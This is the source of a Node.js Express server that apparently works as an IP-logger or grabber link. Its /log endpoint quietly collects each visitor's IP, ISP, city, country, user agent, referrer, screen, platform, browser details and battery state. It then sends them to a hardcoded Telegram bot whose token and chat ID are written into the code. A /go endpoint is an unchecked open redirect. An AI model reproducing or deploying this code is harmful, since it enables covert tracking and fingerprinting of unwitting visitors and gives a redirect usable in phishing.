const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram config
const TELEGRAM_TOKEN = '6266241889:AAFAXCgy2re8Sa60GjVdzfumiTdVKfwsd-4';
const TELEGRAM_CHAT_ID = '5574741182';

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (err) {
        console.error('❌ Telegram error:', err.message);
    }
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('views'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

app.post('/log', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'];
    const ref = req.headers['referer'] || 'Direct';
    const clientData = req.body || {};

    let ispInfo = 'Unknown ISP';
    let city = 'Unknown City';
    let country = 'Unknown Country';

    try {
        const geo = await axios.get(`http://ip-api.com/json/${ip}`);
        ispInfo = geo.data.isp || 'Unknown';
        city = geo.data.city || 'Unknown';
        country = geo.data.country || 'Unknown';
    } catch (err) {
        console.error('Geo lookup failed:', err.message);
    }

    const shortUA = ua.length > 120 ? ua.slice(0, 120) + '...' : ua;

    const log = `
\x1b[36m═════════════════════════════════════════════════════════════\x1b[0m
[\x1b[33m${new Date().toISOString()}\x1b[0m]

\x1b[35mIP:\x1b[0m ${ip}
\x1b[35mISP:\x1b[0m ${ispInfo}
\x1b[35mLocation:\x1b[0m ${city}, ${country}
\x1b[35mUser-Agent:\x1b[0m ${shortUA}
\x1b[35mReferrer:\x1b[0m ${ref}
\x1b[35mScreen:\x1b[0m ${clientData.screen}
\x1b[35mLanguage:\x1b[0m ${clientData.language}
\x1b[35mPlatform:\x1b[0m ${clientData.platform}
\x1b[35mBrowser Info:\x1b[0m ${clientData.browserInfo}
\x1b[35mBattery Level:\x1b[0m ${clientData.battery?.level}
\x1b[35mCharging:\x1b[0m ${clientData.battery?.charging}
\x1b[36m═════════════════════════════════════════════════════════════\x1b[0m
`;

    console.log(log);

    await sendToTelegram(`*New Visitor Logged:*
*IP:* ${ip}
*ISP:* ${ispInfo}
*Location:* ${city}, ${country}
*Battery:* ${clientData.battery?.level} (${clientData.battery?.charging})
*Platform:* ${clientData.platform}
*Screen:* ${clientData.screen}
*Browser:* ${clientData.browserInfo}`);

    res.json({ status: 'logged' });
});

app.get('/go', (req, res) => {
    const target = req.query.url;
    if (!target || !target.startsWith('http')) {
        return res.status(400).send('Invalid URL');
    }
    return res.redirect(target);
});

app.listen(PORT, () => {
    console.log(`✅ Server running on http://localhost:${PORT}`);
});
